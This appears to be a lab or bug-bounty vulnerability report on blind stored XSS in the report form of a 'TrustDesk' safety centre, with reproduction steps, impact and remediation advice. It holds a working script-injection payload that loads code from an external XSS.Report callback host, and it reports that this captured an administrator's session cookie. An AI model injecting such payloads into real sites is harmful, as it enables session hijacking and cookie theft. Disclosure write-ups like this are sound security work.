## Title
Blind XSS - TrustDesk Safety & Trust Center

## Description
A Blind Stored Cross-Site Scripting (XSS) vulnerability was identified in the TrustDesk Safety & Trust Center reporting functionality.

The report form accepts user-controlled input in multiple fields, including the report title, reported URL, username/profile, description, evidence/context, and reporter name. A JavaScript payload submitted through the form was stored and subsequently executed when the submitted report was opened in the administrative interface.

The execution was confirmed through callbacks received by XSS.Report, including a callback associated with the administrator's report-view page.

**Affected URL:** https://trustdesk.pwnedbox.site/report.php  
**Administrative URL:** https://trustdesk.pwnedbox.site/admin/view.php?id=2

## Steps to Reproduce
1. Open `https://trustdesk.pwnedbox.site/report.php`.
2. Enter the test payload in the report form fields and submit the report.
3. Open the submitted report from the administrative dashboard.
4. Check the XSS.Report dashboard for callbacks generated when the report is viewed.

## POC (Proof of Concept)

**Lab Address:** https://trustdesk.pwnedbox.site/report.php

**HTTP Method:** POST

**Payload:**
```html
"><sCRipt src=https://xss.report/c/mihir></sCRipt>
```

**Injection Points:** The screenshots show the payload entered into the report title, reported URL, username/profile, description, evidence/context, and reporter name fields.

**Administrative Page:**
```text
https://trustdesk.pwnedbox.site/admin/view.php?id=2
```

**Observed Result:**
After submitting the report, it was successfully created and assigned case number `TD-48B29739`. When the report was accessed through the administrative interface, XSS.Report recorded callbacks associated with the administrative report-view page.

The XSS.Report evidence also shows that a PHP session cookie value was received. This demonstrates that the injected JavaScript executed in the administrator's browser context and that session-cookie information was exposed to the external collection endpoint.

**Screenshot Evidence:**
1. TrustDesk report submission form containing the test payload.
<img width="1915" height="948" alt="image" src="https://github.com/user-attachments/assets/be0f4a38-cf41-486e-9a9a-c2dd99845140" />

2. Successful report submission showing case number `TD-48B29739`.
<img width="1919" height="966" alt="image" src="https://github.com/user-attachments/assets/4545be92-f8d9-4eb1-89e8-1d16ca4025d3" />

3. Administrative report view displaying the submitted report.
<img width="1919" height="946" alt="image" src="https://github.com/user-attachments/assets/263cc7d1-0bde-475c-9528-73bb831df07d" />

4. XSS.Report activity dashboard showing callbacks from `trustdesk.pwnedbox.site`.
<img width="1919" height="966" alt="image" src="https://github.com/user-attachments/assets/03531eca-615e-4073-984d-cc7c57c5cb66" />

5. XSS.Report detail record showing the administrative page URL and captured cookie information.
<img width="1902" height="982" alt="image" src="https://github.com/user-attachments/assets/d44f95eb-aa75-4db9-ade0-6add8f8a98a9" />


## Impact
An attacker could submit a crafted report containing a malicious JavaScript payload. If an administrator opens the submitted report, the payload may execute in the administrator's browser context.

Potential consequences include:
- Exposure of session-cookie information, where cookies are accessible to JavaScript.
- Unauthorized actions performed through the administrator's authenticated session, depending on application protections.
- Access to sensitive information available within the administrative interface.
- Manipulation of administrative pages and phishing content presented to the administrator.

## Remediation
1. Apply context-aware output encoding to all user-controlled data before rendering it in HTML.
2. Sanitize untrusted input using a well-maintained HTML sanitization library where HTML input is required.
3. Avoid inserting user-controlled data directly into executable HTML, JavaScript, or DOM contexts.
4. Configure session cookies with the `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
5. Implement a restrictive Content Security Policy (CSP) to reduce the impact of injected scripts.
